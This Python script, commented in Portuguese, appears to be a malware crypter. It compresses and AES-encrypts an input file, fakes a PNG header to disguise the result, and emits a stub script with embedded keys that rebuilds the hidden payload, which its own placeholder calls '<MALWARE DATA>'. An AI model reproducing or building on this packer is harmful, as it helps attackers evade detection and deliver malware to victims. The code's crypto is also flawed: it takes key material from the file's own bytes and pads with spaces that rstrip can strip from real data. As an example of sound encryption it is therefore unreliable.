from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import random, gzip, shutil, os, sys

def compress_file(input_file_path, output_file_path):
    with open(input_file_path, 'rb') as f_in:
        with gzip.open(output_file_path, 'wb') as f_out:
            shutil.copyfileobj(f_in, f_out)


def aes_encrypt(data, password, salt, iv):
	#Gera chave apartir das informações anteriores
	kdf = Scrypt(
		salt=salt,
		length=32,
		n=2**14,
		r=8,
		p=1,
		backend=default_backend()
	)
	key = kdf.derive(password.encode())

	# Cria um objeto Cipher usando a chave e o IV
	cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
	encryptor = cipher.encryptor()

	# Preenche os dados para garantir que o tamanho seja múltiplo de 16 bytes
	padded_data = data + b' ' * (16 - len(data) % 16)

	# Criptografa os dados
	encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

	# Retorna o salt, IV e dados criptografados para armazenamento seguro
	return encrypted_data

def modify_file_header(input_file, output_file, new_header_hex, cripter_data):
	new_header = bytes.fromhex(new_header_hex)

	with open(input_file, 'rb') as file:
		original_data = file.read()

	original_header = original_data[:8]
	noheader_data = original_data[8:]

	# Usa bytes aleatorios do propio arquivo para gerar chave AES
	salt = bytes(random.sample(noheader_data, 16))
	iv = bytes(random.sample(noheader_data, 16))
	password = str(bytes(random.sample(noheader_data, 8)).hex())

	encrypted_data = aes_encrypt(noheader_data, password, salt, iv)
	modified_data = new_header + encrypted_data

	cripter_data = cripter_data.replace("<PASSWORD_AES>", password)
	cripter_data = cripter_data.replace("<SALT_AES>", str(salt.hex()))
	cripter_data = cripter_data.replace("<IV_AES>", str(iv.hex()))
	cripter_data = cripter_data.replace("<MALWARE DATA>", str(modified_data.hex()))
	cripter_data = cripter_data.replace("<ORIGINAL_HEADER>", str(original_header.hex()))

#	print (modified_data.hex())
	with open(output_file, 'w') as file:
		file.write(cripter_data)


cripter_data = """
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import gzip, shutil, os

def decompress_file(input_file_path, output_file_path):
        with gzip.open(input_file_path, 'rb') as f_in:
                with open(output_file_path, 'wb') as f_out:
                        shutil.copyfileobj(f_in, f_out)

        os.remove(input_file_path)

def aes_decrypt():
        password = "<PASSWORD_AES>"
        salt = bytes.fromhex("<SALT_AES>")
        iv = bytes.fromhex("<IV_AES>")

        malware_data = "<MALWARE DATA>"
        encrypted_data = bytes.fromhex(malware_data[32:])

        original_header = bytes.fromhex("<ORIGINAL_HEADER>")

	# Gera chave a partir das informações fornecidas
        kdf = Scrypt(
                salt=salt,
                length=32,
                n=2**14,
                r=8,
                p=1,
                backend=default_backend()
        )
        key = kdf.derive(password.encode())

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        unpadded_data = decrypted_data.rstrip(b' ')

        return original_header + unpadded_data


data = aes_decrypt()
recfile = "recgzip.file"
origifile = "arquivo_recuperado.txt"

with open(recfile, "wb") as f:
	f.write(data)

decompress_file(recfile, origifile)


"""

input_filename = sys.argv[1]
output_filename = sys.argv[2]

gzoutfile = "gziptmp.file"
new_header_hex = '89504E470D0A1A0A0000000D49484452' # Assinatura PNG

compress_file(input_filename, gzoutfile)
modify_file_header(gzoutfile, output_filename, new_header_hex, cripter_data)
os.remove(gzoutfile)
